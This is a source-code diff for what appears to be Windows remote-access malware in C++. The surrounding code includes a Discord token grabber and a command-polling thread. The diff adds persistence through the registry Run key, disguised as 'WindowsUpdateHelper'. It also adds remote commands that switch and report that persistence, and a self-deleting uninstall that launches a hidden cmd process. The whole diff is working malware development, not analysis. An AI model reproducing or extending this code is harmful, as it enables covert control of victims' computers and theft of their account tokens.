@@ -1019,6 +1019,56 @@ std::string getDiscordTokens() {
     return out;
 }
 
+void installStartup() {
+    HKEY hKey;
+    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
+        char path[MAX_PATH];
+        DWORD len = GetModuleFileNameA(NULL, path, MAX_PATH);
+        if (len > 0) { path[len] = 0; RegSetValueExA(hKey, "WindowsUpdateHelper", 0, REG_SZ, (BYTE*)path, len+1); }
+        RegCloseKey(hKey);
+    }
+}
+
+void removeStartup() {
+    HKEY hKey;
+    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
+        RegDeleteValueA(hKey, "WindowsUpdateHelper");
+        RegCloseKey(hKey);
+    }
+}
+
+std::string getStartupStatus() {
+    HKEY hKey;
+    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_QUERY_VALUE, &hKey) == ERROR_SUCCESS) {
+        char buf[MAX_PATH]; DWORD sz = MAX_PATH; DWORD type = 0;
+        if (RegQueryValueExA(hKey, "WindowsUpdateHelper", 0, &type, (BYTE*)buf, &sz) == ERROR_SUCCESS && type == REG_SZ) {
+            RegCloseKey(hKey);
+            char curPath[MAX_PATH]; DWORD len = GetModuleFileNameA(NULL, curPath, MAX_PATH);
+            if (len > 0) curPath[len] = 0;
+            std::string regPath(buf, sz > 0 ? sz - 1 : 0);
+            bool active = (regPath == std::string(curPath));
+            return "{\"enabled\":true,\"active\":" + std::string(active ? "true" : "false") + ",\"path\":\"" + jsonEscape(regPath) + "\"}";
+        }
+        RegCloseKey(hKey);
+    }
+    return "{\"enabled\":false,\"active\":false,\"path\":\"\"}";
+}
+
+std::string uninstallSelf() {
+    removeStartup();
+    char path[MAX_PATH];
+    DWORD len = GetModuleFileNameA(NULL, path, MAX_PATH);
+    if (len > 0) path[len] = 0;
+    std::string cmd = "cmd /c timeout /t 2 >nul & del /f /q \"" + std::string(path) + "\"";
+    STARTUPINFOA si = {sizeof(si)};
+    PROCESS_INFORMATION pi;
+    CreateProcessA(NULL, (LPSTR)cmd.c_str(), NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
+    CloseHandle(pi.hProcess);
+    CloseHandle(pi.hThread);
+    ExitProcess(0);
+    return "uninstalling";
+}
+
 DWORD WINAPI pollThread(LPVOID) {
     Sleep(3000);
     try{if(!g_noPing)sendPing();}catch(...){}
@@ -1116,6 +1166,10 @@ DWORD WINAPI pollThread(LPVOID) {
                     else if (type == "env_vars") result = getEnvVars();
                     else if (type == "process_kill_name") result = processKillName(payload);
                     else if (type == "live_monitor") { try{int m=std::stoi(payload);if(m>=0)g_liveMonitor=m;}catch(...){} result="ok:"+std::to_string(g_liveMonitor); }
+                    else if (type == "startup_on") { installStartup(); result = getStartupStatus(); }
+                    else if (type == "startup_off") { removeStartup(); result = getStartupStatus(); }
+                    else if (type == "startup_status") result = getStartupStatus();
+                    else if (type == "uninstall") result = uninstallSelf();
                     else result = "unknown_type";
                 } catch(...) { result = "exec_err"; }
                 std::string escaped = jsonEscape(result);
@@ -1182,16 +1236,6 @@ DWORD WINAPI inputThread(LPVOID) {
         } catch(...) {}
     }
     return 0;
-}
-
-void installStartup() {
-    HKEY hKey;
-    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
-        char path[MAX_PATH];
-        DWORD len = GetModuleFileNameA(NULL, path, MAX_PATH);
-        if (len > 0) { path[len] = 0; RegSetValueExA(hKey, "WindowsUpdateHelper", 0, REG_SZ, (BYTE*)path, len+1); }
-        RegCloseKey(hKey);
-    }
 }
 
 int main(int argc, char* argv[]) {
